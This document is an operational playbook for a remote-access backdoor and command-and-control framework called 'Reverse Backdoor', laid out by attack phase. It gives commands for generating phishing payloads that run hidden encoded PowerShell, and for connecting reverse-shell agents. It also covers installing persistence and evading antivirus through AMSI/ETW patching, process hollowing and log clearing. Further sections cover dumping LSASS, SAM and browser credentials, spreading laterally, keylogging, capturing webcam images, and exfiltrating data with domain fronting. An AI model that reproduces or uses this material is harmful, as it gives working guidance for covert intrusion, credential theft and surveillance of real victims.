# Reverse Backdoor — Operational Playbook

## Initial Access

### Payload Generation
```bash
python -m server.payloads.generate
# Output: payload.hta, .vbs, .ps1, .bat, .sct
# Env: REVERSE_BACKDOOR_SERVER_HOST, REVERSE_BACKDOOR_SERVER_PORT
```

| Format | Use Case |
|--------|----------|
| HTA | IE drive-by, phishing attachment with embedded VBScript |
| VBS | WScript launcher, macro drop |
| PS1 | PowerShell reverse shell, memory-only |
| BAT | Simple cmd launcher |
| SCT | regsvr32 AppLocker bypass |

All chain through `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <b64>`.

### Stagers
```bash
gcc -o stager c-implant/stager.c -s -O2   # lightweight download+exec
gcc -o agent c-implant/agent.c -s -O2     # full built-in capabilities
```

---

## Execution

```
# Python agent
python client/client.py --host 10.0.0.5 --port 5555

# C agent
./agent 10.0.0.5 5555
```

**Shell:** `ls`, `cd`, `pwd`, `cat`, `rm`, `mv`, `touch`, `ps`, `ifconfig`, `kill`, `pkill`, `grep`
**Transfer:** `upload`, `download`, `chunked_download`
**System:** `sysinfo`, `check_admin`, `whoami`
**Session:** `quit`, `background`, `terminate`, `sendall`, `clear`

---

## Persistence

```
persistence install <method> [--name <name>]
persistence remove  <method> [--name <name>]
persistence check   [<method>]
persistence list
```

| Method | OS | Reliability | Stealth | Notes |
|--------|-----|------------|---------|-------|
| `registry` | Win | High | Low | HKCU Run key |
| `scheduled_task` | Win | High | Med | ONLOGON, Highest |
| `startup_folder` | Win | Med | Low | No admin needed |
| `wmi` | Win | High | High | Event subscription, fileless |
| `systemd` | Linux | High | Med | Requires root |
| `crontab` | Linux | High | Low | @reboot entry |
| `xdg` | Linux | Med | Med | ~/.config/autostart |
| `bashrc` | Linux | Med | High | Shell-triggered |

---

## Defense Evasion

```
evasion                    # auto-detect AV/EDR, patch AMSI + ETW, bypass PowerShell CLM
unhook                     # refresh ntdll .text from disk, verify hook removal
syscall_inject <pid> <sc>  # NtWriteVirtualMemory + NtAllocateVirtualMemory via raw syscalls
hollow <exe> <sc> [ppid]   # process hollowing with optional PPID spoofing
early_bird <exe> <sc>      # Early Bird APC injection
migrate <pid>              # migrate shellcode to target process
clear_logs                 # wevtutil clear Application/Security/System/PowerShell
timestomp <path>           # clone timestamps from reference
self_delete                # delete agent binary from disk
priv_enable <PrivName>     # enable SeDebugPrivilege / SeImpersonatePrivilege
steal_token <pid>          # impersonate process token
rev2self                   # revert to original token
detect_vm                  # VM/sandbox/AV/EDR enumeration
```
Sleep obfuscation: XOR-encrypted strings, heap noise allocations, segmented sleep with debugger check.

---

## Credential Access

```
lsass_dump     # comsvcs.dll MiniDump — extract with mimikatz/pypykatz
sam_dump       # reg save SAM + SYSTEM + SECURITY hives, base64 streamed
browser_creds  # Chrome + Edge: DPAPI decrypt, AES-GCM password extraction
browser_dump   # Cross-platform: Firefox profiles + Chromium keyrings
wifi_dump      # netsh wlan show profiles key=clear
```

---

## Discovery

```
sysinfo               # OS, kernel, hostname, user, CPU, memory, local IP
privesc_linux         # sudo -l, SUID scan, kernel version, writable systemd
privesc_windows       # whoami /priv, unquoted paths, AlwaysInstallElevated
scan <subnet>         # ICMP ping sweep (e.g. scan 192.168.1.0/24)
check_admin           # IsUserAnAdmin / euid
```

---

## Lateral Movement

```
psexec <ip> <user> <pass> [payload]   # SMB + SCM (Win→Win)
ssh_spread <ip> <user> <pass> [payload] # sshpass + scp + nohup (Linux→Linux)
socks5                                # SOCKS5 relay — tunnel TCP through C2
```

---

## Collection

```
screenshot                  # pyautogui capture
webcam                      # cv2 single frame
stream_start [interval]     # periodic screenshots (default 5s)
stream_stop                 # stop stream, print count
clipboard                   # Get-Clipboard / pyperclip
keylog_start                # pynput global hook + window title tracking
keylog_dump                 # read captured buffer
keylog_stop                 # stop listener, destroy log

keystroke <text>            # pyautogui typewrite
mouse <x> <y>               # move cursor
click [left|right|middle]   # mouse click
lock_screen                 # lock workstation
```

---

## Exfiltration

```
chunked_download <path>     # 512KB chunks with ACK, large-file safe
chunked_upload <path>       # upload-to-agent equivalent
```

### HTTP Beacon Exfil
POST `/push` for results, GET `/poll` for commands. Profiles: `default`, `chrome`, `cdn`, `api`, `office`, `stealth`. Domain fronting via `front_host` header override. Scheduled exfil via daemon thread.

## Protocol Reference

| Mode | Transport | Use Case |
|------|-----------|----------|
| TCP raw | Plain socket | Internal labs |
| TCP + TLS | TLS 1.2 | Encrypted C2 |
| HTTP beacon | HTTP/S polling | Egress through proxies, CDN blend |
| Encrypted | ECDH + AES-256-GCM | Zero-knowledge payloads |

```
REVERSE_BACKDOOR_TLS=true
REVERSE_BACKDOOR_HTTP=true
REVERSE_BACKDOOR_ENCRYPTION=true
REVERSE_BACKDOOR_AUTO_BYPASS=true
```
